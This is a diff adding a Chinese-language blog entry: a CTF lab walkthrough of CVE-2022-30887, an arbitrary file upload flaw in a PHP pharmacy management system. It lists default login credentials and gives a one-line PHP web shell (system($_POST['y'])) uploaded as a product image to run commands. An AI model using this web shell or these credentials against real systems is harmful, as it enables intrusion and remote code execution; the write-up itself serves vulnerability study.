@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>CVE-2022-30887</title>
+      <link href="/2023/05/10/CVE-2022-30887/"/>
+      <url>/2023/05/10/CVE-2022-30887/</url>
+      
+        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>春秋云境：<a href="https://yunjing.ichunqiu.com/">https://yunjing.ichunqiu.com</a></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的,  该软件的主要目的是在药房和客户之间提供一套接口，客户是该软件的主要用户。该软件有助于为药房业务创建一个综合数据库，并根据到期、产品等各种参数提供各种报告。 该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞，进而导致任意代码执行</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p> 0x01 打开环境</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230510153223753.png" alt="image-20230510153223753"></p><p>0x02 使用邮箱跟密码进行登录</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">email：mayuri.infospace@gmail.com</span><br><span class="line">passwd：mayurik</span><br></pre></td></tr></table></figure><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230510153946210.png" alt="image-20230510153946210"></p><p>0x03 文件上传点在Medicine -&gt; add Medicine </p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230510154203210.png" alt="image-20230510154203210"></p><p>0x04 上传一句话</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;y&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230510155903450.png" alt="image-20230510155903450"></p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230510155958303.png" alt="image-20230510155958303"></p><p>0x05 复制图像链接</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230510160021675.png" alt="image-20230510160021675"></p><p>0x06 在地址栏输入图片链接 通过上传的shell执行命令 获取flag</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230510160614786.png" alt="image-20230510160614786"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CVE-2022-32991</title>
       <link href="/2023/05/09/CVE-2022-32991/"/>
       <url>/2023/05/09/CVE-2022-32991/</url>
